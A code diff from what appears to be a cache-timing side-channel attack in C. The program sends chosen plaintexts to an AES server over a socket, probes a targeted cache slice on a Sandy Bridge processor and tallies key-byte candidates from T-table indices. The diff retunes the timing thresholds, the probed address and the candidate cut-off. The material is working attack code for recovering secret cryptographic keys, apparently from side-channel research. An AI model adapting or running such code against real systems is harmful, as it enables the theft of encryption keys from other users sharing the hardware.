@@ -9,9 +9,9 @@
 
 #include <math.h>
 
-#define EMPIRICAL_CACHE_ACCESS_TIME 345
+#define EMPIRICAL_CACHE_ACCESS_TIME 2700
 #define REPS 1
-#define CIPHERTEXTS 1000000 //20000000
+#define CIPHERTEXTS 1000000     //20000000
 
 unsigned long int possible_key_space(int X[16][256]);
 
@@ -37,7 +37,7 @@ int main(int argc, char* argv[])
     F[2048] = 0xAA;
 
 
-    if (!sandybridge_i5_2435m_setup_m2(F)) {       //0x56961540
+    if (!sandybridge_i5_2435m_setup_m2(F)) {       //0x137cfc620
         printf("[x] Not enough memory could be allocated on required cache-slice, please try again and/or increase hugepages available memory");
         return 0;
     }
@@ -94,11 +94,11 @@ int main(int argc, char* argv[])
             if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
             if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
 
-            //x += F[0];
+            x += F[1024];
             //printf("sandybridge_i5_2435m_probe\n");
             prob_time = sandybridge_i5_2435m_probe_m2(); printf("%lu\n", prob_time); //return 0;
 
-            //if (prob_time < 360) 
+            //if (prob_time < 2350) 
             //    printf("prob_time\t:\t%d\n", prob_time);
 
             if (min_prob_time > prob_time) {
@@ -179,7 +179,7 @@ unsigned long int possible_key_space(int X[16][256]) {
 
     for (m = 0; m < 16; ++m) {
         for (i = 0; i < 256; ++i) {
-            if (X[m][i] < 1) {
+            if (X[m][i] < 10) {
                 for (j = 0; j < 16; ++j) {
                     TeN = (get_TeN_idx(4, j/4) & (0xFF<<(j%4)*8) ) >> (j%4)*8;
                     K[m][i ^ TeN] += 1;
